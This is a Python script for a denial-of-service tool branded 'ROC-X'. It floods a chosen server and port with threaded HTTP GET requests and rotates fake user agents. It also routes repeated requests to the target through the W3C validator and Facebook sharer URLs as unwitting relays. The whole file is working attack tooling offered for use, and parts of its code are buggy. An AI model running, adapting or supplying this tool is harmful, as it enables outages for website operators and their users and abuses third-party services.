#!/usr/bin/python3
# -*- coding: utf-8 -*-



import sys
from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random,os

#CVALUE
blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
black="\033[0;30m"
line=yellow+"======================================================================================================================"+end
space=" "
logo=red+str("""
     8888888b.   .d88888b.   .d8888b.       Y88b   d88P 
     888   Y88b d88P" "Y88b d88P  Y88b       Y88b d88P  
     888    888 888     888 888    888        Y88o88P   
     888   d88P 888     888 888        888888  Y888P    
     8888888P"  888     888 888        888888  d888b    
     888 T88b   888     888 888    888        d88888b   
     888  T88b  Y88b. .d88P Y88b  d88P       d88P Y88b  
     888   T88b  "Y88888P"   "Y8888P"       d88P   Y88b""")+end
total_sent=0
total_not_sent=0


os.system("clear || cls")
print(logo+cyan+"\n\n\t\tDeveloped By : Sanaur Asif\n\t\tConcept From : Hammer\n\n"+end+line+"\n"+end)
def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	uagent.append("Mozilla / 5.0(X11;Linux i686; rv:81.0) Gecko / 20100101 Firefox / 81.0")
	uagent.append("Mozilla / 5.0(Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
	uagent.append("Mozilla / 5.0(X11;Ubuntu;Linuxi686;rv:81.0) Gecko / 20100101Firefox / 81.0")
	uagent.append("Mozilla / 5.0(X11;Ubuntu;Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
	uagent.append("Mozilla / 5.0(X11;Fedora;Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
	return(uagent)



def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)


def my_bots2():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)



def bot_rippering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print(cyan+" \t[✓] Bot is Attacking...."+end)
			total_sent+=1
			time.sleep(.1)
	except:
		time.sleep(.1)

def bot_again_rippering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
			print(cyan+" \t[√] Bot is Attacking....."+end)
			total_sent+=1
			time.sleep(.1)
	except:
		time.sleep(.2)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print (green+"\t[✓] ROC-X sent Packet! Attacking... \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91m\t [×] No connection! Web server maybe Down!\033[0m")
		total_not_sent+=1
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_rippering(random.choice(bots)+"http://"+host)
		w.task_done()

#def dos3():
  #  while True:
  #      item = e.get()
  #      bot_rippering(random.choice(bots)+"http://"+host)
  #      e.task_done()

def usage():
	time.sleep(3)
	pass

	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Rippers")
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 or 443 -t 135 or 443")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port

	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo



# reading headers
try:
	global data
	headers = open("headers.txt", "r")
	data = headers.read()
	headers.close()
	#task queue are q,w,e
	q = Queue()
	w = Queue()
	e = Queue()


	if __name__ == '__main__':
		if len(sys.argv) < 2:
			usage()
		get_parameters()
		print("\t  \033[92msite:",host," port: ",str(port)," turbo: ",str(thr),"\033[0m\n\n")
		print("\033[94m\t\t    [°] Please wait...\033[0m")
		user_agent()
		my_bots()
		time.sleep(5)
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			s.settimeout(1)
		except socket.error as e:
			print("\033[91m\n\n\t        [×] Check server IP and Port\n\t        [×] Check Internet Connection\033[0m")
			tahahhj=input("\n"+cyan+"\t\t  Press Enter to Continue")
		while True:
			for i in range(int(thr)):
				t = threading.Thread(target=dos)
				t.daemon = True  # if thread is exist, it dies
				t.start()
				t2 = threading.Thread(target=dos2)
				t2.daemon = True  # if thread is exist, it dies
				t2.start()
		#	t3 = threading/Thread(target=dos3)
		#	t3.daemon = True # if thread is exist, it dies
		#	t3.start()
			start = time.time()
		#tasking
			item = 0
			while True:
				if (item>1800): # for no memory crash
					item=0
					time.sleep(.1)
				item = item + 1
				q.put(item)
				w.put(item)
				e.put(item)
			q.join()
		w.join()
	e.join()

except KeyboardInterrupt:
	os.system("clear || cls")
	print(logo+cyan+"\n\n\t\tDeveloped By : Sanaur Asif\n\t\tConcept From : Hammer\n\n"+end+line+"\n"+end)
	print(cyan+"\n\n\t\t[•] Total Tried : "+str(total_sent+total_not_sent)+green+"\n\t\t[√] Total Sent : "+red+str(total_sent)+"\n\t\t[×] Total Not Sent : "+str(total_not_sent))
	jwjsis=input(cyan+"\n\n\t      Prees Enter Key to Continue")
	os.system("python3 ddos_opt.py")
